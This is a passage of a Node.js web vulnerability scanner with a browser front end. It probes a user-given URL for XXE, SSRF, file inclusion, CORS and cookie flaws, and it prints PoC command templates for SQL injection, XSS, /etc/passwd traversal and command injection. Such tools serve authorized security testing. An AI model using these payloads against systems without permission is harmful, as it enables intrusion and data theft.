          this.addVulnerability('FILE_INCLUSION',
            'Local file inclusion vulnerability detected',
            'High',
            'PHP file contents exposed via base64 encoding',
            `curl "${testUrl}"`
          );
        }

        VULNERABILITY_PATTERNS.file_inclusion.forEach(pattern => {
          if (response.data.includes(pattern)) {
            this.addVulnerability('FILE_INCLUSION',
              'File inclusion vulnerability detected',
              'High',
              `File inclusion error: ${pattern}`,
              `curl "${testUrl}"`
            );
          }
        });

      } catch (error) {
        // Continue with next payload
      }
    }
  }

  async testXXEVulnerabilities() {
    console.log('🔍 Testing XXE vulnerabilities...');
    
    for (const payload of ATTACK_PAYLOADS.xxe) {
      try {
        const response = await axios.post(this.target, payload, {
          headers: {
            ...this.headers,
            'Content-Type': 'application/xml'
          },
          timeout: 8000
        });

        // Check for XXE success indicators
        if (response.data.includes('root:') || response.data.includes('localhost')) {
          this.addVulnerability('XXE',
            'XML External Entity (XXE) vulnerability detected',
            'High',
            'XXE attack successful - file contents exposed',
            `curl -X POST -H "Content-Type: application/xml" -d '${payload.substring(0, 100)}...' ${this.target}`
          );
        }

      } catch (error) {
        // Continue with next payload
      }
    }
  }

  async testSSRFVulnerabilities() {
    console.log('🔍 Testing SSRF vulnerabilities...');
    
    const testParams = ['url', 'link', 'src', 'target', 'redirect', 'proxy', 'fetch', 'get', 'load'];
    
    for (const payload of ATTACK_PAYLOADS.ssrf) {
      for (const param of testParams) {
        try {
          const testUrl = `${this.target}?${param}=${encodeURIComponent(payload)}`;
          const response = await axios.get(testUrl, {
            headers: this.headers,
            timeout: 15000
          });

          VULNERABILITY_PATTERNS.ssrf.forEach(pattern => {
            if (response.data.includes(pattern)) {
              this.addVulnerability('SSRF',
                'Server-Side Request Forgery (SSRF) vulnerability detected',
                'High',
                `Parameter "${param}" allows SSRF. Response contains: ${pattern}`,
                `curl "${testUrl}"`
              );
            }
          });

        } catch (error) {
          // Timeout or connection errors might indicate SSRF
          if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
            // This could indicate SSRF but needs careful analysis
          }
        }
      }
    }
  }

  async advancedTesting() {
    console.log('🔍 Phase 4: Advanced Security Testing');
    
    await Promise.all([
      this.testSubdomainTakeover(),
      this.testCORSMisconfiguration(),
      this.testClickjacking(),
      this.testSecureCookies(),
      this.testHTTPSRedirection(),
      this.testRateLimiting()
    ]);
  }

  async testSubdomainTakeover() {
    // Basic subdomain takeover check
    try {
      const response = await axios.get(this.target, {
        headers: this.headers,
        timeout: 5000
      });

      const takeoverIndicators = [
        'NoSuchBucket', 'No Such Account', 'Repository not found',
        'Project not found', 'Domain not found', 'Site not found',
        'There isn\'t a GitHub Pages site here', 'The request could not be satisfied'
      ];

      takeoverIndicators.forEach(indicator => {
        if (response.data.includes(indicator)) {
          this.addVulnerability('SUBDOMAIN_TAKEOVER',
            'Potential subdomain takeover vulnerability',
            'High',
            `Found takeover indicator: ${indicator}`,
            `curl ${this.target}`
          );
        }
      });

    } catch (error) {
      // Continue
    }
  }

  async testCORSMisconfiguration() {
    try {
      const response = await axios.get(this.target, {
        headers: {
          ...this.headers,
          'Origin': 'https://evil.com'
        },
        timeout: 5000
      });

      const corsHeader = response.headers['access-control-allow-origin'];
      if (corsHeader === '*' || corsHeader === 'https://evil.com') {
        this.addVulnerability('CORS_MISCONFIGURATION',
          'CORS misconfiguration detected',
          'Medium',
          `Access-Control-Allow-Origin: ${corsHeader}`,
          `curl -H "Origin: https://evil.com" -I ${this.target}`
        );
      }

    } catch (error) {
      // Continue
    }
  }

  async testClickjacking() {
    if (this.baseResponse) {
      const xFrameOptions = this.baseResponse.headers['x-frame-options'];
      const csp = this.baseResponse.headers['content-security-policy'];
      
      if (!xFrameOptions && (!csp || !csp.includes('frame-ancestors'))) {
        this.addVulnerability('CLICKJACKING',
          'Clickjacking vulnerability - missing frame protection',
          'Medium',
          'Site can be embedded in frames, allowing clickjacking attacks',
          `curl -I ${this.target} | grep -i "x-frame-options\\|content-security-policy"`
        );
      }
    }
  }

  async testSecureCookies() {
    if (this.baseResponse && this.baseResponse.headers['set-cookie']) {
      const cookies = this.baseResponse.headers['set-cookie'];
      cookies.forEach(cookie => {
        if (!cookie.includes('Secure')) {
          this.addVulnerability('INSECURE_COOKIE',
            'Cookie without Secure flag',
            'Medium',
            `Cookie not marked as Secure: ${cookie.split(';')[0]}`,
            `curl -I ${this.target} | grep -i "set-cookie"`
          );
        }
        
        if (!cookie.includes('HttpOnly')) {
          this.addVulnerability('INSECURE_COOKIE',
            'Cookie without HttpOnly flag',
            'Medium',
            `Cookie accessible via JavaScript: ${cookie.split(';')[0]}`,
            `curl -I ${this.target} | grep -i "set-cookie"`
          );
        }
      });
    }
  }

  async testHTTPSRedirection() {
    if (this.target.startsWith('http://')) {
      try {
        const response = await axios.get(this.target, {
          headers: this.headers,
          timeout: 5000,
          maxRedirects: 0,
          validateStatus: () => true
        });

        if (response.status !== 301 && response.status !== 302) {
          this.addVulnerability('NO_HTTPS_REDIRECT',
            'HTTP not redirected to HTTPS',
            'Medium',
            'Website accepts HTTP connections without redirecting to HTTPS',
            `curl -I ${this.target}`
          );
        }

      } catch (error) {
        // Continue
      }
    }
  }

  async testRateLimiting() {
    // Basic rate limiting test
    try {
      const requests = [];
      for (let i = 0; i < 10; i++) {
        requests.push(axios.get(this.target, {
          headers: this.headers,
          timeout: 3000,
          validateStatus: () => true
        }));
      }

      const responses = await Promise.all(requests);
      const success = responses.filter(r => r.status === 200).length;
      
      if (success === 10) {
        this.addVulnerability('NO_RATE_LIMITING',
          'No rate limiting detected',
          'Low',
          'Server accepts rapid requests without rate limiting',
          `for i in {1..10}; do curl -w "%{http_code}\\n" -s -o /dev/null ${this.target}; done`
        );
      }

    } catch (error) {
      // Continue
    }
  }

  addVulnerability(type, title, severity, description, poc = '') {
    this.vulnerabilities.push({
      id: crypto.randomBytes(8).toString('hex'),
      type,
      title,
      severity,
      description,
      timestamp: new Date().toISOString(),
      poc: poc || this.generateAdvancedPOC(type, title, description),
      cvss: this.calculateCVSS(type, severity),
      remediation: this.getRemediation(type)
    });
  }

  generateAdvancedPOC(type, title, description) {
    const pocTemplates = {
      XSS: `
# XSS Proof of Concept
# Target: ${this.target}
# Vulnerability: ${title}

## Manual Testing:
curl "${this.target}?q=<script>alert('XSS')</script>"

## Browser Testing:
${this.target}?q=<img src=x onerror=alert('XSS')>

## Description:
${description}

## Impact:
- Session hijacking
- Account takeover
- Defacement
- Phishing attacks
      `,
      SQL_INJECTION: `
# SQL Injection Proof of Concept
# Target: ${this.target}
# Vulnerability: ${title}

## Manual Testing:
curl "${this.target}?id=' OR '1'='1"

## Time-based Testing:
curl "${this.target}?id=' OR SLEEP(5)--"

## Union-based Testing:
curl "${this.target}?id=' UNION SELECT NULL,username,password FROM users--"

## Description:
${description}

## Impact:
- Data extraction
- Data modification
- Authentication bypass
- Server compromise
      `,
      DIRECTORY_TRAVERSAL: `
# Directory Traversal Proof of Concept
# Target: ${this.target}
# Vulnerability: ${title}

## Manual Testing:
curl "${this.target}?file=../../../etc/passwd"

## Windows Testing:
curl "${this.target}?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

## URL Encoded:
curl "${this.target}?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

## Description:
${description}

## Impact:
- File disclosure
- Configuration exposure
- Source code access
      `,
      COMMAND_INJECTION: `
# Command Injection Proof of Concept
# Target: ${this.target}
# Vulnerability: ${title}

## Manual Testing:
curl "${this.target}?cmd=id"

## Chained Commands:
curl "${this.target}?cmd=; id"
curl "${this.target}?cmd=| whoami"
curl "${this.target}?cmd=\$(id)"

## Description:
${description}

## Impact:
- Remote code execution
- Server compromise
- Data exfiltration
      `
    };

    return pocTemplates[type] || `
# Proof of Concept for ${type}
# Target: ${this.target}
# Vulnerability: ${title}

## Testing Command:
curl -i "${this.target}"

## Description:
${description}
    `;
  }

  calculateCVSS(type, severity) {
    const cvssScores = {
      'Critical': { 'SQL_INJECTION': 9.8, 'COMMAND_INJECTION': 9.8, 'default': 9.0 },
      'High': { 'XSS': 8.8, 'DIRECTORY_TRAVERSAL': 8.6, 'FILE_INCLUSION': 8.6, 'default': 8.0 },
      'Medium': { 'CSRF_MISSING': 6.1, 'CORS_MISCONFIGURATION': 5.3, 'default': 6.0 },
      'Low': { 'INFO_DISCLOSURE': 3.1, 'MISSING_SECURITY_HEADER': 3.1, 'default': 3.0 }
    };

    return cvssScores[severity]?.[type] || cvssScores[severity]?.['default'] || 0.0;
  }

  getRemediation(type) {
    const remediations = {
      'XSS': 'Implement proper input validation and output encoding. Use Content Security Policy (CSP).',
      'SQL_INJECTION': 'Use parameterized queries and prepared statements. Implement input validation.',
      'DIRECTORY_TRAVERSAL': 'Implement proper input validation and path sanitization. Use chroot jail.',
      'COMMAND_INJECTION': 'Avoid system calls with user input. Use parameterized commands.',
      'MISSING_SECURITY_HEADER': 'Configure proper security headers in web server or application.',
      'INFO_DISCLOSURE': 'Remove sensitive information from public-facing responses.',
      'CSRF_MISSING': 'Implement CSRF tokens for state-changing operations.',
      'CORS_MISCONFIGURATION': 'Configure CORS policy to allow only trusted origins.',
      'CLICKJACKING': 'Implement X-Frame-Options or CSP frame-ancestors directive.'
    };

    return remediations[type] || 'Review and implement appropriate security controls.';
  }

  generateComprehensiveReport() {
    const severityCounts = {
      Critical: 0,
      High: 0,
      Medium: 0,
      Low: 0,
      Info: 0
    };

    this.vulnerabilities.forEach(vuln => {
      severityCounts[vuln.severity]++;
    });

    // Calculate risk score
    const riskScore = this.calculateRiskScore(severityCounts);

    return {
      target: this.target,
      scanTimestamp: new Date().toISOString(),
      scanDuration: 'Comprehensive scan completed',
      summary: {
        totalVulnerabilities: this.vulnerabilities.length,
        severityBreakdown: severityCounts,
        riskScore: riskScore,
        riskLevel: this.getRiskLevel(riskScore),
        testedEndpoints: this.testedEndpoints.size,
        foundFiles: this.foundFiles.size
      },
      vulnerabilities: this.vulnerabilities.sort((a, b) => {
        const severityOrder = { 'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1, 'Info': 0 };
        return severityOrder[b.severity] - severityOrder[a.severity];
      }),
      recommendations: this.generateAdvancedRecommendations(),
      technicalDetails: {
        testedEndpoints: Array.from(this.testedEndpoints),
        foundFiles: Array.from(this.foundFiles),
        scanStatistics: this.getScanStatistics()
      }
    };
  }

  calculateRiskScore(severityCounts) {
    return (severityCounts.Critical * 10) + 
           (severityCounts.High * 7) + 
           (severityCounts.Medium * 4) + 
           (severityCounts.Low * 1);
  }

  getRiskLevel(score) {
    if (score >= 50) return 'Critical';
    if (score >= 25) return 'High';
    if (score >= 10) return 'Medium';
    if (score > 0) return 'Low';
    return 'Minimal';
  }

  generateAdvancedRecommendations() {
    const recommendations = [];
    const vulnTypes = [...new Set(this.vulnerabilities.map(v => v.type))];

    if (vulnTypes.includes('XSS')) {
      recommendations.push({
        priority: 'High',
        category: 'Input Validation',
        recommendation: 'Implement comprehensive XSS protection including input validation, output encoding, and Content Security Policy'
      });
    }

    if (vulnTypes.includes('SQL_INJECTION')) {
      recommendations.push({
        priority: 'Critical',
        category: 'Database Security',
        recommendation: 'Migrate to parameterized queries and implement database security best practices'
      });
    }

    if (vulnTypes.includes('MISSING_SECURITY_HEADER')) {
      recommendations.push({
        priority: 'Medium',
        category: 'Security Headers',
        recommendation: 'Implement all recommended security headers including HSTS, CSP, and frame protection'
      });
    }

    if (vulnTypes.includes('INFO_DISCLOSURE')) {
      recommendations.push({
        priority: 'Medium',
        category: 'Information Security',
        recommendation: 'Remove all sensitive information from public responses and error messages'
      });
    }

    // Add general recommendations
    recommendations.push(
      {
        priority: 'High',
        category: 'Security Monitoring',
        recommendation: 'Implement comprehensive security monitoring and logging'
      },
      {
        priority: 'Medium',
        category: 'Security Testing',
        recommendation: 'Establish regular penetration testing and vulnerability assessment schedule'
      },
      {
        priority: 'Medium',
        category: 'Incident Response',
        recommendation: 'Develop and maintain incident response procedures'
      }
    );

    return recommendations;
  }

  getScanStatistics() {
    return {
      totalRequests: this.testedEndpoints.size + ATTACK_PAYLOADS.xss.length * 10,
      vulnerabilityTypes: [...new Set(this.vulnerabilities.map(v => v.type))],
      averageCVSS: this.vulnerabilities.length > 0 ? 
        (this.vulnerabilities.reduce((sum, v) => sum + v.cvss, 0) / this.vulnerabilities.length).toFixed(1) : 0,
      scanCoverage: {
        endpoints: `${this.testedEndpoints.size}/${COMMON_ENDPOINTS.length}`,
        payloads: Object.values(ATTACK_PAYLOADS).reduce((sum, arr) => sum + arr.length, 0)
      }
    };
  }
}

// API Routes
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🛡️ Advanced Web Security Scanner</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container { 
                max-width: 1200px; 
                margin: 0 auto; 
                background: white;
                border-radius: 15px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                overflow: hidden;
            }
            .header {
                background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
                color: white;
                padding: 30px;
                text-align: center;
            }
            .header h1 { font-size: 2.5rem; margin-bottom: 10px; }
            .header p { font-size: 1.1rem; opacity: 0.9; }
            .content { padding: 40px; }
            .warning { 
                background: linear-gradient(135deg, #ff9a56 0%, #ffad56 100%);
                color: white;
                padding: 20px; 
                margin: 20px 0; 
                border-radius: 10px;
                border-left: 5px solid #ff6b35;
            }
            .warning strong { display: block; margin-bottom: 10px; font-size: 1.2rem; }
            .form-group { margin: 30px 0; }
            .form-group label { 
                display: block; 
                margin-bottom: 10px; 
                font-weight: 600;
                color: #333;
                font-size: 1.1rem;
            }
            .url-input { 
                width: 100%; 
                padding: 15px; 
                border: 2px solid #e1e5e9;
                border-radius: 8px;
                font-size: 1rem;
                transition: border-color 0.3s;
            }
            .url-input:focus { 
                outline: none; 
                border-color: #667eea;
                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            }
            .scan-button { 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 8px;
                cursor: pointer; 
                font-size: 1.1rem;
                font-weight: 600;
                transition: transform 0.2s, box-shadow 0.2s;
                margin-top: 15px;
            }
            .scan-button:hover { 
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
            }
            .scan-button:disabled {
                background: #ccc;
                cursor: not-allowed;
                transform: none;
                box-shadow: none;
            }
            .loading { 
                text-align: center; 
                padding: 40px;
                color: #667eea;
            }
            .spinner {
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #667eea;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .results { margin-top: 30px; }
            .results-header {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 20px;
            }
            .vulnerability { 
                border: 1px solid #e1e5e9; 
                margin: 15px 0; 
                padding: 20px; 
                border-radius: 10px;
                transition: box-shadow 0.2s;
            }
            .vulnerability:hover {
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
            .critical { border-left: 5px solid #dc3545; background: #fdf2f2; }
            .high { border-left: 5px solid #fd7e14; background: #fef8f1; }
            .medium { border-left: 5px solid #ffc107; background: #fffdf0; }
            .low { border-left: 5px solid #28a745; background: #f1f8f4; }
            .info { border-left: 5px solid #17a2b8; background: #f0f8fa; }
            .vuln-header { display: flex; justify-content: between; align-items: center; margin-bottom: 15px; }
            .vuln-title { font-size: 1.2rem; font-weight: 600; margin: 0; }
            .vuln-severity { 
                padding: 5px 12px; 
                border-radius: 20px; 
                font-size: 0.9rem; 
                font-weight: 600;
                text-transform: uppercase;
            }
            .severity-critical { background: #dc3545; color: white; }
            .severity-high { background: #fd7e14; color: white; }
            .severity-medium { background: #ffc107; color: #333; }
            .severity-low { background: #28a745; color: white; }
            .severity-info { background: #17a2b8; color: white; }
            .poc-details { 
                background: #f8f9fa; 
                border-radius: 5px; 
                margin-top: 15px;
            }
            .poc-details summary {
                padding: 15px;
                cursor: pointer;
                font-weight: 600;
                background: #e9ecef;
                border-radius: 5px;
            }
            .poc-details[open] summary {
                border-radius: 5px 5px 0 0;
            }
            .poc-content { 
                padding: 15px; 
                background: #ffffff;
                border-radius: 0 0 5px 5px;
            }
            .poc-content pre { 
                background: #f1f3f4; 
                padding: 15px; 
                border-radius: 5px; 
                overflow-x: auto;
                font-size: 0.9rem;
                border-left: 3px solid #667eea;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin: 20px 0;
            }
            .stat-card {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
            }
            .stat-number { font-size: 2rem; font-weight: bold; display: block; }
            .stat-label { font-size: 0.9rem; opacity: 0.9; }
            .recommendations {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                margin-top: 30px;
            }
            .recommendation {
                background: white;
                padding: 15px;
                margin: 10px 0;
                border-radius: 8px;
                border-left: 4px solid #667eea;
            }
            .rec-priority {
                font-weight: 600;
                margin-bottom: 5px;
            }
            .priority-critical { color: #dc3545; }
            .priority-high { color: #fd7e14; }
            .priority-medium { color: #ffc107; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛡️ Advanced Web Security Scanner</h1>
                <p>Comprehensive vulnerability assessment and penetration testing tool</p>
            </div>
            
            <div class="content">
                <div class="warning">
                    <strong>⚠️ AUTHORIZED TESTING ONLY</strong>
                    This tool is designed for authorized security testing and bug bounty research only. 
                    Only scan websites you own or have explicit written permission to test.
                    Unauthorized scanning may violate laws and terms of service.
                </div>

                <div class="form-group">
                    <label for="targetUrl">🎯 Target URL:</label>
                    <input type="url" id="targetUrl" class="url-input" placeholder="https://example.com" required />
                    <button onclick="startComprehensiveScan()" class="scan-button" id="scanBtn">
                        🚀 Start Comprehensive Security Scan
                    </button>
                </div>

                <div id="results" class="results"></div>
            </div>
        </div>

        <script>
            async function startComprehensiveScan() {
                const url = document.getElementById('targetUrl').value;
                if (!url) {
                    alert('Please enter a valid URL');
                    return;
                }

                const scanBtn = document.getElementById('scanBtn');
                const resultsDiv = document.getElementById('results');
                
                scanBtn.disabled = true;
                scanBtn.textContent = '🔍 Scanning in Progress...';
                
                resultsDiv.innerHTML = \`
                    <div class="loading">
                        <div class="spinner"></div>
                        <h3>🔍 Comprehensive Security Scan in Progress</h3>
                        <p>This may take several minutes. Please wait...</p>
                        <div style="margin-top: 20px; text-align: left; background: #f8f9fa; padding: 20px; border-radius: 10px;">
                            <h4>Scan Progress:</h4>
                            <ul style="margin-top: 10px; line-height: 1.8;">
                                <li>📊 Phase 1: Information Gathering</li>
                                <li>🔍 Phase 2: Endpoint Discovery</li>
                                <li>⚡ Phase 3: Vulnerability Testing</li>
                                <li>🛡️ Phase 4: Advanced Security Analysis</li>
                            </ul>
                        </div>
                    </div>
                \`;

                try {
                    const response = await fetch('/scan', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ target: url })
                    });

                    const result = await response.json();
                    displayComprehensiveResults(result);
                } catch (error) {
                    resultsDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
                } finally {
                    scanBtn.disabled = false;
                    scanBtn.textContent = '🚀 Start Comprehensive Security Scan';
                }
            }

            function displayComprehensiveResults(result) {
                if (result.error) {
                    document.getElementById('results').innerHTML = '<div class="error">❌ Error: ' + result.error + '</div>';
                    return;
                }

                let html = \`
                    <div class="results-header">
                        <h2>📊 Comprehensive Security Assessment Results</h2>
                        <div><strong>Target:</strong> \${result.target}</div>
                        <div><strong>Scan Completed:</strong> \${new Date(result.scanTimestamp).toLocaleString()}</div>
                        <div><strong>Risk Level:</strong> <span class="risk-\${result.summary.riskLevel.toLowerCase()}">\${result.summary.riskLevel}</span></div>
                    </div>

                    <div class="stats-grid">
                        <div class="stat-card">
                            <span class="stat-number">\${result.summary.totalVulnerabilities}</span>
                            <span class="stat-label">Total Vulnerabilities</span>
                        </div>
                        <div class="stat-card">
                            <span class="stat-number">\${result.summary.riskScore}</span>
                            <span class="stat-label">Risk Score</span>
                        </div>
                        <div class="stat-card">
                            <span class="stat-number">\${result.summary.testedEndpoints}</span>
                            <span class="stat-label">Endpoints Tested</span>
                        </div>
                        <div class="stat-card">
                            <span class="stat-number">\${result.technicalDetails.scanStatistics.averageCVSS}</span>
                            <span class="stat-label">Average CVSS</span>
                        </div>
                    </div>

                    <div class="stats-grid">
                        <div class="stat-card" style="background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);">
                            <span class="stat-number">\${result.summary.severityBreakdown.Critical}</span>
                            <span class="stat-label">Critical</span>
                        </div>
                        <div class="stat-card" style="background: linear-gradient(135deg, #fd7e14 0%, #e55a00 100%);">
                            <span class="stat-number">\${result.summary.severityBreakdown.High}</span>
                            <span class="stat-label">High</span>
                        </div>
                        <div class="stat-card" style="background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);">
                            <span class="stat-number">\${result.summary.severityBreakdown.Medium}</span>
                            <span class="stat-label">Medium</span>
                        </div>
                        <div class="stat-card" style="background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);">
                            <span class="stat-number">\${result.summary.severityBreakdown.Low}</span>
                            <span class="stat-label">Low</span>
                        </div>
                    </div>
                \`;

                if (result.vulnerabilities.length > 0) {
                    html += '<h3>🚨 Vulnerabilities Discovered:</h3>';
                    result.vulnerabilities.forEach((vuln, index) => {
                        html += \`
                            <div class="vulnerability \${vuln.severity.toLowerCase()}">
                                <div class="vuln-header">
                                    <h4 class="vuln-title">\${vuln.title}</h4>
                                    <span class="vuln-severity severity-\${vuln.severity.toLowerCase()}">\${vuln.severity}</span>
                                </div>
                                <div><strong>Type:</strong> \${vuln.type}</div>
                                <div><strong>CVSS Score:</strong> \${vuln.cvss}</div>
                                <div><strong>Description:</strong> \${vuln.description}</div>
                                <div><strong>Remediation:</strong> \${vuln.remediation}</div>
                                <details class="poc-details">
                                    <summary>🔍 Proof of Concept & Testing Commands</summary>
                                    <div class="poc-content">
                                        <pre>\${vuln.poc}</pre>
                                    </div>
                                </details>
                            </div>
                        \`;
                    });
                } else {
                    html += '<div style="text-align: center; padding: 40px; color: #28a745;"><h3>✅ No vulnerabilities detected!</h3><p>The target appears to be secure based on our tests.</p></div>';
                }

                if (result.recommendations && result.recommendations.length > 0) {
                    html += \`
                        <div class="recommendations">
                            <h3>💡 Security Recommendations:</h3>
                    \`;
                    result.recommendations.forEach(rec => {
                        html += \`
                            <div class="recommendation">
                                <div class="rec-priority priority-\${rec.priority.toLowerCase()}">
                                    \${rec.priority} Priority - \${rec.category}
                                </div>
                                <div>\${rec.recommendation}</div>
                            </div>
                        \`;
                    });
                    html += '</div>';
                }

                document.getElementById('results').innerHTML = html;
            }

            // Auto-focus on URL input
            document.getElementById('targetUrl').focus();
            
            // Allow Enter key to start scan
            document.getElementById('targetUrl').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    startComprehensiveScan();
                }
            });
        </script>
    </body>
    </html>
  `);
});

app.post('/scan', async (req, res) => {
  try {
    const { target } = req.body;
    
    if (!target || !target.match(/^https?:\/\/.+/)) {
      return res.status(400).json({ error: 'Invalid target URL. Must start with http:// or https://' });
    }

    console.log(`🚀 Starting authorized comprehensive scan for: ${target}`);
    
    const scanner = new WebSecurityScanner(target);
    const results = await scanner.scanTarget();
    
    console.log(`✅ Scan completed. Found ${results.vulnerabilities?.length || 0} vulnerabilities`);
    
    res.json(results);
  } catch (error) {
    console.error('Scan error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'operational', 
    service: 'Advanced Web Security Scanner',
    version: '2.0.0',
    timestamp: new Date().toISOString()
  });
});

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Advanced Web Security Scanner running on port ${PORT}`);
  console.log(`🛡️ Comprehensive vulnerability assessment tool ready`);
  console.log(`⚠️  REMEMBER: Only scan websites you own or have explicit permission to test!`);
  console.log(`🔗 Access the scanner: http://localhost:${PORT}`);
});
